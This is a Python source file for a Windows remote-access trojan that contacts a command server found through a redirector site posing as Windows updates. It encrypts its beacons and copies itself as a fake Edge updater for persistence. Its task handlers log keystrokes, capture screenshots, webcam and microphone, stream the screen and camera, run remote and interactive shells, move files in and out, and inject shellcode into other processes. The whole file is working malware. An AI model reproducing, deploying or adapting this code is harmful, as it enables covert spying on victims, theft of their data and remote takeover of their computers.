import os
import io
import queue
import re
import sys
import uuid
import json
import time
import base64
import random
import threading
import subprocess
import requests
import wmi
import winreg
import ctypes
import ctypes.wintypes as wt
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import mss
import cv2
import pyaudio
import wave
import keyboard
import numpy as np
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ===================== CONFIG =====================
REDIRECTOR_URL = "https://windows-updates.vercel.app/"
c2_url = ""                     # Dynamic — resolved at runtime
c2_fetch_backoff = 60.0         # seconds, float for easy *=
pending_results = []
screen_streaming = False
stream_active = False
stream_lock = threading.Lock()
stream_thread = None
results_lock = threading.Lock()
screen_streaming = False
screen_stream_lock = threading.Lock()
screen_stream_thread = None
shell_process = None
shell_output_queue = queue.Queue()


BEACON_KEY = b"0123456789abcdef0123456789abcdef"  # 32-byte key, match server
SLEEP_BASE = 5   # seconds
JITTER_PCT = 20  # %
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0",
]
# ================================================

aesgcm = AESGCM(BEACON_KEY)

def encrypt(data: bytes) -> bytes:
    nonce = os.urandom(12)
    ct = aesgcm.encrypt(nonce, data, None)
    return nonce + ct

def decrypt(data: bytes) -> bytes:
    nonce = data[:12]
    ct = data[12:]
    return aesgcm.decrypt(nonce, ct, None)

def get_jittered_sleep():
    jitter = SLEEP_BASE * (JITTER_PCT / 100.0)
    sleep = SLEEP_BASE + random.uniform(-jitter, jitter)
    return max(sleep, 3)  # min 3s

def random_ua():
    return random.choice(USER_AGENTS)

def generate_implant_id():
    # Persistent ID from registry MachineGuid (stealthy)
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        val, _ = winreg.QueryValueEx(key, "MachineGuid")
        winreg.CloseKey(key)
        return val.upper()
    except:
        pass
    # Fallback WMI
    try:
        return wmi.WMI().Win32_ComputerSystemProduct()[0].UUID
    except:
        return str(uuid.uuid4())

def establish_persistence():
    script_path = os.path.abspath(__file__)
    persist_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Edge", "edgeupd.py")
    if script_path.lower() == persist_path.lower():
        return
    try:
        os.makedirs(os.path.dirname(persist_path), exist_ok=True)
        with open(script_path, "rb") as f:
            data = f.read()
        with open(persist_path, "wb") as f:
            f.write(data)
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "MicrosoftEdgeUpdate", 0, winreg.REG_SZ, f"pythonw \"{persist_path}\"")
        winreg.CloseKey(key)
    except:
        pass  # silent fail

# ===================== TASK HANDLERS =====================
keylog_buffer = []
keylog_lock = threading.Lock()

def start_keylogger():
    def on_press(event):
        with keylog_lock:
            keylog_buffer.append(event.name)
    keyboard.on_press(on_press)

def stop_keylogger():
    keyboard.unhook_all()

def get_and_clear_keylog():
    with keylog_lock:
        if not keylog_buffer:
            return ""
        log = " ".join(keylog_buffer)
        keylog_buffer.clear()
        return log

def capture_screenshot():
    with mss.mss() as sct:
        img = sct.grab(sct.monitors[0])
        buf = io.BytesIO()
        # Convert raw to JPEG
        from PIL import Image
        pil_img = Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX")
        pil_img.save(buf, format="JPEG", quality=70)
        return buf.getvalue()

def capture_webcam():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()
    if not ret:
        raise Exception("Webcam failed")
    _, buf = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
    return buf.tobytes()

def record_mic(seconds=10):
    p = pyaudio.PyAudio()
    stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024)
    frames = []
    for _ in range(0, int(44100 / 1024 * seconds)):
        data = stream.read(1024)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    p.terminate()
    wf = wave.open(io.BytesIO(), 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(p.get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()
    return wf.getvalue()  # WAV bytes

def inject_shellcode(pid: int, sc: bytes):
    # Classic CreateRemoteThread injection
    kernel32 = ctypes.WinDLL('kernel32')
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT_RESERVE = 0x3000
    PAGE_EXECUTE_READWRITE = 0x40

    ph = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    if not ph:
        return "OpenProcess failed"
    alloc = kernel32.VirtualAllocEx(ph, 0, len(sc), MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE)
    if not alloc:
        return "VirtualAllocEx failed"
    written = ctypes.c_size_t()
    if not kernel32.WriteProcessMemory(ph, alloc, sc, len(sc), ctypes.byref(written)):
        return "WriteProcessMemory failed"
    th = kernel32.CreateRemoteThread(ph, None, 0, alloc, 0, 0, None)
    return f"Injected into PID {pid}" if th else "CreateRemoteThread failed"


def get_camera():
    # Try indices 0 through 2
    for i in range(3):
        cap = cv2.VideoCapture(i, cv2.CAP_DSHOW) # Use DSHOW for faster init on Windows
        if cap.isOpened():
            return cap
    return None
    


# ===================== MAIN BEACON LOOP =====================
implant_id = generate_implant_id()
hostname = os.getenv("COMPUTERNAME")
username = os.getenv("USERNAME")
session = requests.Session()
session.verify = False  # match Go InsecureSkipVerify


def fetch_beacon_url() -> str:
    print("Fetching url : ...")
    try:
        headers = {"User-Agent": random_ua()}
        resp = session.get(REDIRECTOR_URL, headers=headers, timeout=15)
        resp.raise_for_status()
    except Exception as e:
        raise Exception(f"Redirector fetch failed: {e}")

    html = resp.text

    # Primary: capture content between <div id="sysupdate">...</div>
    match = re.search(r'<div[^>]+id\s*=\s*["\']sysupdate["\'][^>]*>(.*?)</div>', html, re.I | re.S)
    if not match:
        # Fallback: no closing tag → grab until next < or end
        match = re.search(r'<div[^>]+id\s*=\s*["\']sysupdate["\'][^>]*>([^<]+)', html, re.I | re.S)
    if not match:
        raise Exception("C2 URL not found in redirector page")

    content = match.group(1).strip()
    print(content)

    # Extract first valid URL
    url_match = re.search(r'https?://[^\s"\'<>]+', content)
    if not url_match:
        raise Exception(f"No valid URL found in sysupdate div: '{content}'")

    c2_url = url_match.group(0).rstrip(".,;")  # clean trailing punctuation
    return c2_url


def main():
    #establish_persistence()
    if "keylog" in sys.argv:  # optional: start keylogger early
        start_keylogger()
    global c2_url, c2_fetch_backoff, pending_results
    
    while True:
        if not c2_url:
            try:
                c2_url = fetch_beacon_url()
                print(f"[+] Resolved C2: {c2_url}")  # debug — remove in prod
                c2_fetch_backoff = 60.0  # reset
            except Exception as e:
                print(f"[-] C2 resolution failed: {e}")  # debug
                time.sleep(c2_fetch_backoff)
                if c2_fetch_backoff < 35 * 60:  # cap at 35 min like Go
                    c2_fetch_backoff *= 2
               
                continue
        # Periodic keylog exfil
        logs = get_and_clear_keylog()
        if logs:
            with results_lock:
                pending_results.append({"task_id": "keylog_periodic", "output": logs})

        payload = {
            "id": implant_id,
            "os": "windows",
            "arch": "amd64",
            "user": username,
            "host": hostname,
            "results": pending_results[:]
        }
        try:
            enc_payload = encrypt(json.dumps(payload).encode())
            resp = session.post(c2_url, data=enc_payload, headers={"User-Agent": random_ua()}, timeout=30)
            if resp.status_code != 200:
                time.sleep(get_jittered_sleep())
                continue
            dec_resp = decrypt(resp.content)
            tasks = json.loads(dec_resp).get("tasks", [])
            ack_ids = json.loads(dec_resp).get("ack_ids", [])

            # ACK processed results
            with results_lock:
                pending_results = [r for r in pending_results if r["task_id"] not in ack_ids]

            for task in tasks:
                threading.Thread(target=handle_task, args=(task,)).start()

        except Exception:
            pass
        time.sleep(get_jittered_sleep())

# ============== SCREEN STREAM =============

def screen_stream_worker(duration: int = 0):  # 0 = indefinite
    global screen_streaming
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Primary full screen
        start_time = time.time()
        chunk_id = 0

        while screen_streaming:
            if duration > 0 and (time.time() - start_time) > duration:
                break

            img = sct.grab(monitor)
            # Fast raw → numpy → JPEG encode (smaller than PNG for stream)
            frame_np = np.array(img)
            frame_bgr = cv2.cvtColor(frame_np, cv2.COLOR_BGRA2BGR)
            _, buffer = cv2.imencode('.jpg', frame_bgr, [int(cv2.IMWRITE_JPEG_QUALITY), 60])

            b64_chunk = base64.b64encode(buffer).decode()
            result = {
                "task_id": f"screen_stream_chunk_{chunk_id}",
                "output": f"SCREEN_STREAM_CHUNK:{b64_chunk}"
            }
            with results_lock:
                pending_results.append(result)

            chunk_id += 1
            time.sleep(0.5)  # ~2 FPS – stealthy bandwidth, stable on low-end targets

        # Send end marker
        with results_lock:
            pending_results.append({"task_id": "screen_stream_end", "output": "SCREEN_STREAM_END"})

def start_screen_stream(duration_sec: int = 0):
    global screen_streaming, screen_stream_thread
    with screen_stream_lock:
        if screen_streaming:
            return "Already running"
        screen_streaming = True
        screen_stream_thread = threading.Thread(target=screen_stream_worker, args=(duration_sec,), daemon=True)
        screen_stream_thread.start()
        return f"Screen stream started ({'indefinite' if duration_sec == 0 else f'{duration_sec}s'})"

def stop_screen_stream():
    global screen_streaming
    with screen_stream_lock:
        if not screen_streaming:
            return "Not running"
        screen_streaming = False
        if screen_stream_thread:
            screen_stream_thread.join(timeout=3)
        return "Screen stream stopped"

# ===================== NEW: REVERSE WEBCAM STREAM =====================

def webcam_stream_worker(duration: int):
    """Capture webcam frames and push as multipart chunks via beacon results"""
    global stream_active
    global webcam_streaming
    webcam_streaming = True
    cap = get_camera()
    
    if cap is None:
        with results_lock:
            pending_results.append({"task_id": "webcam_live", "error": "No camera found"})
        webcam_streaming = False
        stream_active = False
        return
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        return

    fps = 15
    interval = 1.0 / fps
    start_time = time.time()
    chunk_id = 0

    boundary = "aptframeboundary"
    while stream_active and (duration == 0 or time.time() - start_time < duration):
        ret, frame = cap.read()
        if not ret:
            break

        _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 60])
        jpg_bytes = buffer.tobytes()

        # Build multipart part
        part = (
            f"--{boundary}\r\n"
            f"Content-Type: image/jpeg\r\n"
            f"Content-Length: {len(jpg_bytes)}\r\n"
            f"X-Frame-Index: {chunk_id}\r\n\r\n"
        ).encode() + jpg_bytes + b"\r\n"

        # Immediate exfil as result (no wait for next beacon)
        result = {
            "task_id": f"webcam_stream_chunk_{chunk_id}",
            "output": f"SWEBCAM_STREAM_CHUNK:{base64.b64encode(part).decode()}"
        }
        with results_lock:
            pending_results.append(result)

        chunk_id += 1
        time.sleep(max(0, interval - (time.time() - start_time - chunk_id/fps)))

    cap.release()
    # Final chunk marker
    final = {
        "task_id": "webcam_stream_end",
        "output": "SWEBCAM_STREAM_END"
    }
    with results_lock:
        pending_results.append(final)

def start_webcam_stream(duration_sec: int = 0):  # 0 = indefinite until stop
    global stream_active, stream_thread
    with stream_lock:
        if stream_active:
            return "Already running"
        stream_active = True
        stream_thread = threading.Thread(target=webcam_stream_worker, args=(duration_sec,), daemon=True)
        stream_thread.start()
        return f"Webcam stream started (duration={'indefinite' if duration_sec==0 else f'{duration_sec}s'})"

def stop_webcam_stream():
    global stream_active
    with stream_lock:
        if not stream_active:
            return "Not running"
        stream_active = False
        if stream_thread:
            stream_thread.join(timeout=5)
        return "Webcam stream stopped"


def get_sysinfo():
    import platform
    info = {
        "machine": platform.machine(),
        "version": platform.version(),
        "platform": platform.platform(),
        "processor": platform.processor(),
    }
    return json.dumps(info)

def shell_worker():
    global shell_process
    # Start a persistent cmd.exe session
    shell_process = subprocess.Popen(
        ["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, 
        stderr=subprocess.STDOUT, shell=True, text=True, bufsize=1
    )
    
    # Reader thread to push output to a queue
    def reader():
        for line in iter(shell_process.stdout.readline, ""):
            shell_output_queue.put(line)
            
    threading.Thread(target=reader, daemon=True).start()


def handle_task(task):
    tid = task["task_id"]
    ttype = task["type"]
    cmd = task.get("cmd", "")
    result = {"task_id": tid, "output": "", "error": ""}

    try:
        if ttype == "screenshot":
            data = capture_screenshot()
            result["output"] = "SCREENSHOT:" + base64.b64encode(data).decode()
        elif ttype == "webcam":
            data = capture_webcam()
            result["output"] = "WEBCAM:" + base64.b64encode(data).decode()
        elif ttype == "mic":
            secs = int(cmd) if cmd.isdigit() else 10
            data = record_mic(secs)
            result["output"] = "AUDIO:" + base64.b64encode(data).decode()
        elif ttype == "shell":
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
            result["output"] = out.decode(errors="ignore")
        elif ttype == "file_download":
            with open(cmd, "rb") as f:
                data = f.read()
            result["output"] = f"FILE_DOWNLOAD:{os.path.basename(cmd)}:{base64.b64encode(data).decode()}"
        elif ttype == "file_upload":
            path, b64 = cmd.split(":", 1)
            with open(path, "wb") as f:
                f.write(base64.b64decode(b64))
            result["output"] = f"Uploaded {path}"

        elif ttype == "webcam_stream":
            parts = cmd.split()
            action = parts[0].lower()
            duration = 0
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except:
                    duration = 0

            if action == "start":
                msg = start_webcam_stream(duration)
                result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
            elif action == "stop":
                msg = stop_webcam_stream()
                result["output"] = f"SWEBCAM_STREAM_STATUS:{msg}"
        elif ttype == "screen_stream":
            parts = cmd.split()
            action = parts[0].lower()
            duration = 0
            if len(parts) > 1:
                try:
                    duration = int(parts[1])
                except:
                    duration = 0

            if action == "start":
                msg = start_screen_stream(duration)
                result["output"] = f"SCREEN_STREAM_STATUS:{msg}"
            elif action == "stop":
                msg = stop_screen_stream()
                result["output"] = f"SCREEN_STREAM_STATUS:{msg}"

        elif ttype == "ishell":
            if cmd.strip().lower() == "exit":
                if shell_process:
                    shell_process.terminate()
                    shell_process = None
                    result["output"] = "ISHELL_OUTPUT:\n[!] Shell Session Terminated.\n"
            else:
                if shell_process is None:
                    shell_worker()
                
                shell_process.stdin.write(cmd + "\n")
                shell_process.stdin.flush()
                
                # Read available output
                output = ""
                time.sleep(0.2) # Small delay to catch immediate response
                try:
                    while not shell_output_queue.empty():
                        output += shell_output_queue.get_nowait()
                except: pass
                result["output"] = "ISHELL_OUTPUT:" + output
                

        elif ttype == "keylog":
            if cmd == "start":
                start_keylogger()
                result["output"] = "Keylogger started"
            elif cmd == "stop":
                stop_keylogger()
                result["output"] = "Keylogger stopped"
        elif ttype == "inject":
            parts = cmd.split(" ")
            pid = int(parts[0])
            sc = base64.b64decode(parts[1])
            result["output"] = inject_shellcode(pid, sc)
        # Add more as needed (sysinfo, etc.)
        elif ttype == "sysinfo":
            result["output"] = get_sysinfo()

    except Exception as e:
        result["error"] = str(e)

    with results_lock:
        pending_results.append(result)

if __name__ == "__main__":
    import sys
    main()

